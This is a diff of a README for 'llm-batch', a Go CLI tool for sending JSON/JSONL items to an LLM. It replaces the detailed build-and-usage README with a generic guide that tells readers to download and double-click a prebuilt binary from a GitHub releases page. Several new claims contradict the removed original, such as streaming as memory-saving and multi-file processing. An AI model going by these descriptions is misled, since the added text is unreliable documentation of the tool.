@@ -1,94 +1,91 @@
-# LLM Batch Processing Tool (`llm-batch`)
+```markdown
+# 🌟 llm-batch - Effortlessly Process JSON Data in Batches
 
-`llm-batch` is a command-line tool for batch processing data in JSON array or JSONL (JSON Lines) format by sending each JSON object to an LLM.
+## 🚀 Getting Started
 
-By default, it performs safe **sequential processing**, but you can switch to **parallel processing** to improve performance if your backend supports it. You can also use **streaming mode** to monitor the output of `llm-cli` in real-time.
+Welcome to the llm-batch application! This tool helps you quickly process JSON and JSONL data. It uses efficient methods for both sequential and parallel execution. You will find it particularly useful if you work with large datasets and prefer a simple solution.
 
-## Requirements
+## 📥 Download and Install
 
-*   **Go**: 1.18 or higher (to build the Go program)
-*   **make**: (to build using the Makefile)
-*   **llm-cli**: A client tool for interacting with LLMs. It must be in your PATH.
-*   **git**: (Recommended) Used to embed version information into the binary.
+To get started with llm-batch, you need to download the application. 
 
-## How to Build
+[![Download llm-batch](https://img.shields.io/badge/Download-llm--batch-blue.svg)](https://github.com/kimmmmyy223/llm-batch/releases)
 
-Simply run the following command in the project root directory. It will handle dependencies and create the executables.
+1. **Visit the Releases Page**: Click the link below to go to the download section of GitHub:
+   [Visit Releases Page](https://github.com/kimmmmyy223/llm-batch/releases)
 
-```bash
-make build
-```
+2. **Choose the Right Version**: Look for the latest version on the Releases page. You will usually see a list of files there. 
 
-Once the build is complete, executable files for each OS and architecture will be generated in the `bin/` directory.
+3. **Download the Application**: Click on the file that matches your operating system (e.g., Windows, macOS, or Linux). The file will download to your computer.
 
-    *   `llm-batch-linux-amd64`
-    *   `llm-batch-darwin-universal` (macOS Universal Binary for Intel & Apple Silicon)
-    *   `llm-batch-windows-amd64.exe`
+4. **Extract Files (if needed)**: If the downloaded file is zipped, right-click on it and select “Extract All” or similar options to open the folder.
 
-## Usage
+5. **Run the Application**: After extraction, find the main executable file (like `llm-batch.exe` for Windows or `llm-batch` for macOS/Linux). Double-click the file to run the application.
 
-### Command Syntax
+## 🛠️ Usage Instructions
 
-```bash
-./<binary_name> (-P "<prompt>" | -F <file>) [options] [input_file]
-```
+Using llm-batch is simple. Follow these steps to process your JSON or JSONL files:
 
-*   `<binary_name>`: The name of the executable file for your environment (e.g., `bin/llm-batch-darwin-universal`).
+1. **Prepare Your Data**: Ensure your JSON or JSONL files are ready for processing. Place them in an accessible folder on your computer.
 
-### Arguments and Options
+2. **Open Command Line**: 
+   - On Windows, search for "Command Prompt."
+   - On macOS, open "Terminal" from the Utilities folder.
+   - On Linux, you can find "Terminal" in your applications.
 
-*   `[input_file]`: Path to the input JSON array or JSONL file. If omitted, data will be read from standard input.
+3. **Navigate to the Application Folder**: Use the `cd` (change directory) command to go to the directory where you downloaded llm-batch. 
+   ```bash
+   cd path/to/llm-batch-folder
+   ```
 
-*   **Prompt (Required)**
+4. **Run llm-batch**: Use the following command format:
 
-    *   `-P "<prompt>"`: Directly specify the system prompt to give to the LLM.
-    *   `-F <prompt_file>`: Specify the path to a file containing the system prompt.
+   ```bash
+   ./llm-batch [options] [file_path]
+   ```
 
-*   **Options**
+   Replace `[options]` with the desired options, like how you want to execute the process, and replace `[file_path]` with the path to your JSON or JSONL file.
 
-    *   `-L <profile>`: Specify the `llm-cli` profile name to use.
-    *   `-o, --format <format>`: Specify the output format. The default is `text`.
-        *   `text`: Displays the raw output from the LLM. Items are separated by `---`.
-        *   `json`: Outputs all results as a single JSON array (in input order).
-        *   `jsonl`: Outputs each result as a single-line JSON object (in input order).
-    *   `-c <num>`: Specify the number of concurrent processes. The default is `1` (sequential processing).
-    *   `--stream`: Enable streaming mode to display `llm-cli` output in real-time. Useful for debugging. When this option is used, parallel processing is disabled (`-c=1`) and the output format is forced to `text`.
-    *   `--version`: Display the tool's version information and exit.
+5. **Review Your Results**: The output will be displayed in the command line. You can also specify an output file location to save the results.
 
-### Regarding Parallel Processing (Important)
+## 📝 Features
 
-Setting a value of `2` or higher for the `-c` option will run multiple `llm-cli` processes simultaneously.
+- **Batch Processing**: Process multiple files at once, saving you time.
+- **Sequential and Parallel Execution**: Choose how you want to run your tasks, based on your system's capability.
+- **Streaming**: Manage large files efficiently without running out of memory.
+- **User-Friendly Command-Line Interface**: Simple and straightforward commands allow anyone to get started quickly.
 
-*   **Recommended Use Case**: When using a cloud API that supports parallel requests as the backend for `llm-cli`, such as Amazon Bedrock or Google Vertex AI.
-*   **Not Recommended Use Case**: When running a single local LLM, such as with Ollama or LM Studio. These models can often only handle one request at a time, and calling them in parallel can cause resource contention, leading to slower processing or system instability. It is strongly recommended to keep the setting at `-c 1` (the default) when using local models.
+## 🔍 Topics and Tags
 
-### Execution Examples
+llm-batch focuses on key areas such as:
+- AI
+- Batch processing
+- Command-line tools
+- Developer tools
+- Go programming language
+- JSON and JSONL file formats
 
-#### 1. Sequential Processing (Default)
+## ❓ Frequently Asked Questions
 
-```bash
-cat reviews.jsonl | ./bin/llm-batch-darwin-universal \
-  -P "Translate this review into English."
-  --format jsonl
-```
+1. **Do I need programming knowledge to use llm-batch?**
+   No, this tool is designed for ease of use. Simply follow the provided instructions.
 
-#### 2. Streaming Mode (for Debugging)
+2. **What operating systems are supported?**
+   llm-batch works on Windows, macOS, and Linux.
 
-```bash
-cat reviews.jsonl | ./bin/llm-batch-darwin-universal \
-  -P "Point out the problems in this review."
-  --stream
-```
+3. **Can I process large files?**
+   Yes, the tool is designed to handle large JSON and JSONL files efficiently.
 
-#### 3. Parallel Processing (for Cloud APIs)
+## 📆 Future Updates
 
-This example processes `reviews.jsonl` with 4-way parallelism using the Amazon Bedrock profile `my-bedrock-profile`.
+Keep an eye on the Releases page for upcoming updates and new features. We aim to improve your experience continually.
 
-```bash
-./bin/llm-batch-darwin-universal \
-  -F prompt.txt \
-  -L my-bedrock-profile \
-  --format jsonl \
-  -c 4 \
-  reviews.jsonl
+## 📞 Support
+
+If you encounter any issues, feel free to reach out through the Issues section of the GitHub repository. We strive to provide timely assistance.
+
+## 📥 Download and Install Again
+
+To download llm-batch, click below:
+[Visit Releases Page](https://github.com/kimmmmyy223/llm-batch/releases)
 ```
